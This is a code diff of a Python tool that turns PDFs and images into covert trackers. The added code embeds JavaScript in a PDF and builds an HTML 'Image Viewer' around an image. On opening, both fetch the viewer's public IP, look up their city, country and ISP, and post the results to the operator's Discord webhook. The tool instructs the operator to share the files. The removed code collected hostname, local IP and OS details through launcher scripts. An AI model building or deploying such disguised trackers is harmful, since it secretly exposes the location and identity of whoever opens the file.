@@ -174,98 +174,68 @@ def create_tracking_pdf(original_pdf, webhook_url):
     try:
         # Create a copy of the original PDF
         output_pdf = f"tracking_{os.path.basename(original_pdf)}"
-        with open(original_pdf, 'rb') as src, open(output_pdf, 'wb') as dst:
-            dst.write(src.read())
         
-        # Create a Python script that will be executed when the PDF is opened
+        # Create a JavaScript tracking script
         tracking_script = f"""
-import requests
-import socket
-import platform
-import json
-import os
-import subprocess
-
-def get_system_info():
-    try:
-        hostname = socket.gethostname()
-        local_ip = socket.gethostbyname(hostname)
-        system = platform.system()
-        machine = platform.machine()
-        processor = platform.processor()
-        return {{
-            'hostname': hostname,
-            'local_ip': local_ip,
-            'system': system,
-            'machine': machine,
-            'processor': processor
+var trackingScript = function() {{
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', 'https://api.ipify.org?format=json', true);
+    xhr.onload = function() {{
+        if (xhr.status === 200) {{
+            var data = JSON.parse(xhr.responseText);
+            var publicIP = data.ip;
+            
+            // Get location info
+            var xhr2 = new XMLHttpRequest();
+            xhr2.open('GET', 'http://ip-api.com/json/' + publicIP, true);
+            xhr2.onload = function() {{
+                if (xhr2.status === 200) {{
+                    var details = JSON.parse(xhr2.responseText);
+                    var message = "PDF Opened - IP Information:\\n";
+                    message += "Public IP: " + publicIP + "\\n";
+                    
+                    if (details.status === 'success') {{
+                        message += "Location: " + details.city + ", " + details.country + "\\n";
+                        message += "ISP: " + details.isp + "\\n";
+                    }}
+                    
+                    // Send to Discord
+                    var xhr3 = new XMLHttpRequest();
+                    xhr3.open('POST', '{webhook_url}', true);
+                    xhr3.setRequestHeader('Content-Type', 'application/json');
+                    xhr3.send(JSON.stringify({{ content: message }}));
+                }}
+            }};
+            xhr2.send();
         }}
-    except Exception as e:
-        return None
+    }};
+    xhr.send();
+}};
 
-def send_to_discord():
-    try:
-        system_info = get_system_info()
-        message_parts = ["PDF Opened - IP Information:"]
-        
-        if system_info:
-            message_parts.extend([
-                f"Hostname: {{system_info['hostname']}}",
-                f"Local IP: {{system_info['local_ip']}}",
-                f"OS: {{system_info['system']}}",
-                f"Machine: {{system_info['machine']}}",
-                f"Processor: {{system_info['processor']}}"
-            ])
-        
-        # Get public IP
-        ip_response = requests.get('https://api.ipify.org?format=json')
-        public_ip = ip_response.json()['ip']
-        message_parts.append(f"Public IP: {{public_ip}}")
-        
-        # Get location info
-        details_response = requests.get(f'http://ip-api.com/json/{{public_ip}}')
-        details = details_response.json()
-        
-        if details['status'] == 'success':
-            message_parts.extend([
-                f"Location: {{details.get('city', 'Unknown')}}, {{details.get('country', 'Unknown')}}",
-                f"ISP: {{details.get('isp', 'Unknown')}}"
-            ])
-        
-        message = "\\n".join(message_parts)
-        requests.post('{webhook_url}', json={{"content": message}})
-    except Exception as e:
-        pass
-
-# Execute tracking when PDF is opened
-if __name__ == "__main__":
-    send_to_discord()
+// Execute tracking when PDF is opened
+trackingScript();
 """
-        # Save the tracking script
-        script_path = "tracking_script.py"
-        with open(script_path, 'w') as f:
-            f.write(tracking_script)
         
-        # Create a batch file to run the script when PDF is opened
-        if sys.platform == "win32":
-            batch_content = f"""@echo off
-start "" "{output_pdf}"
-python "{script_path}"
-"""
-            batch_file = f"open_{os.path.basename(output_pdf)}.bat"
-            with open(batch_file, 'w') as f:
-                f.write(batch_content)
-        else:
-            shell_content = f"""#!/bin/bash
-xdg-open "{output_pdf}"
-python3 "{script_path}"
-"""
-            shell_file = f"open_{os.path.basename(output_pdf)}.sh"
-            with open(shell_file, 'w') as f:
-                f.write(shell_content)
-            os.chmod(shell_file, 0o755)  # Make shell script executable
+        # Create a PDF with embedded JavaScript
+        from PyPDF2 import PdfReader, PdfWriter
+        reader = PdfReader(original_pdf)
+        writer = PdfWriter()
+        
+        # Copy all pages from original PDF
+        for page in reader.pages:
+            writer.add_page(page)
+        
+        # Add JavaScript to the PDF
+        writer.add_js(tracking_script)
+        
+        # Save the modified PDF
+        with open(output_pdf, 'wb') as output_file:
+            writer.write(output_file)
         
         console.print(f"[green]Successfully created tracking PDF![/green]")
+        console.print("\n[bold yellow]Important:[/bold yellow]")
+        console.print("1. Share the [bold]tracking_*.pdf[/bold] file directly")
+        console.print("2. When someone opens this PDF on any device, it will automatically send tracking information to your Discord webhook")
         show_file_location(output_pdf)
         return output_pdf
     except Exception as e:
@@ -277,78 +247,72 @@ def create_tracking_image(original_image, webhook_url):
     try:
         # Create a copy of the original image
         output_image = f"tracking_{os.path.basename(original_image)}"
-        with open(original_image, 'rb') as src, open(output_image, 'wb') as dst:
-            dst.write(src.read())
         
-        # Create a Python script that will be executed when the image is opened
-        tracking_script = f"""
-import requests
-import socket
-import platform
-import json
-import os
-
-def get_system_info():
-    try:
-        hostname = socket.gethostname()
-        local_ip = socket.gethostbyname(hostname)
-        system = platform.system()
-        machine = platform.machine()
-        processor = platform.processor()
-        return {{
-            'hostname': hostname,
-            'local_ip': local_ip,
-            'system': system,
-            'machine': machine,
-            'processor': processor
+        # Create an HTML file that displays the image and includes tracking
+        html_content = f"""
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Image Viewer</title>
+    <style>
+        body {{ margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #000; }}
+        img {{ max-width: 100%; max-height: 100vh; }}
+    </style>
+</head>
+<body>
+    <img src="{os.path.basename(original_image)}" alt="Image">
+    <script>
+        async function trackIP() {{
+            try {{
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                const publicIP = data.ip;
+                
+                const detailsResponse = await fetch(`http://ip-api.com/json/${{publicIP}}`);
+                const details = await detailsResponse.json();
+                
+                let message = "Image Opened - IP Information:\\n";
+                message += `Public IP: ${{publicIP}}\\n`;
+                
+                if (details.status === 'success') {{
+                    message += `Location: ${{details.city}}, ${{details.country}}\\n`;
+                    message += `ISP: ${{details.isp}}\\n`;
+                }}
+                
+                await fetch('{webhook_url}', {{
+                    method: 'POST',
+                    headers: {{ 'Content-Type': 'application/json' }},
+                    body: JSON.stringify({{ content: message }})
+                }});
+            }} catch (error) {{
+                console.error('Tracking error:', error);
+            }}
         }}
-    except Exception as e:
-        return None
 
-def send_to_discord():
-    try:
-        system_info = get_system_info()
-        message_parts = ["Image Opened - IP Information:"]
-        
-        if system_info:
-            message_parts.extend([
-                f"Hostname: {system_info['hostname']}",
-                f"Local IP: {system_info['local_ip']}",
-                f"OS: {system_info['system']}",
-                f"Machine: {system_info['machine']}",
-                f"Processor: {system_info['processor']}"
-            ])
-        
-        # Get public IP
-        ip_response = requests.get('https://api.ipify.org?format=json')
-        public_ip = ip_response.json()['ip']
-        message_parts.append(f"Public IP: {public_ip}")
-        
-        # Get location info
-        details_response = requests.get(f'http://ip-api.com/json/{public_ip}')
-        details = details_response.json()
-        
-        if details['status'] == 'success':
-            message_parts.extend([
-                f"Location: {details.get('city', 'Unknown')}, {details.get('country', 'Unknown')}",
-                f"ISP: {details.get('isp', 'Unknown')}"
-            ])
-        
-        message = "\\n".join(message_parts)
-        requests.post('{webhook_url}', json={{"content": message}})
-    except Exception as e:
-        pass
-
-# Execute tracking when image is opened
-send_to_discord()
+        // Execute tracking when page loads
+        window.addEventListener('load', trackIP);
+    </script>
+</body>
+</html>
 """
-        # Save the tracking script
-        with open("tracking_script.py", 'w') as f:
-            f.write(tracking_script)
+        
+        # Save the HTML file
+        html_file = f"tracking_{os.path.splitext(original_image)[0]}.html"
+        with open(html_file, 'w', encoding='utf-8') as f:
+            f.write(html_content)
+        
+        # Copy the original image to the same directory as the HTML file
+        import shutil
+        shutil.copy2(original_image, os.path.dirname(html_file))
         
         console.print(f"[green]Successfully created tracking image![/green]")
-        show_file_location(output_image)
-        return output_image
+        console.print("\n[bold yellow]Important:[/bold yellow]")
+        console.print("1. Share the [bold]tracking_*.html[/bold] file")
+        console.print("2. When someone opens this file on any device, it will:")
+        console.print("   - Display the image")
+        console.print("   - Send tracking information to your Discord webhook")
+        show_file_location(html_file)
+        return html_file
     except Exception as e:
         console.print(f"[red]Error creating tracking image: {str(e)}[/red]")
         return None
